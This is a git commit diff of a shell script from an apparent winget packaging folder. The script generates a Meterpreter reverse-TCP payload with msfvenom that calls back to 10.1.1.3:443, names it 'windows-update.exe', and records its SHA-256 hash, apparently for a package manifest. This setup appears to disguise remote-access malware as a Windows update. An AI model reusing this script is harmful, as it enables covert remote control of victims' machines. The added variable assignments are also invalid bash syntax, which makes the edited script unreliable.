4938057754fa534cbc16b2b9be30878bec5fe4bc
Samuel <114468569+SentinelSamuel@users.noreply.github.com>
2022-12-29 16:12:30 +0100

    Update change-sha256.sh

--- winget/change-sha256.sh
+++ winget/change-sha256.sh
@@ -1,8 +1,27 @@
 #/bin/bash
-sudo rm windows-update.exe
-sudo rm ../../windows-update.exe
+
+if ! command -v pwsh &> /dev/null; then
+        sudo apt install powershell
+fi
+
+$FILE1=windows-update.exe
+$FILE2=../../windows-update.exe
+$FILE3=./sha256
+
+if test -f "$FILE1"; then 
+        sudo rm $FILE1
+fi
+
+if test -f "$FILE2"; then
+        sudo rm $FILE2
+fi
+
 sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.3 LPORT=443 -f exe > windows-update.exe
 sudo cp windows-update.exe ../../windows-update.exe
-sudo rm sha256
+
+if test -f "$FILE3"; then
+        sudo rm $FILE3
+fi
+
 sudo openssl dgst -sha256 windows-update.exe > sha256
 sudo pwsh out-sha256.ps1
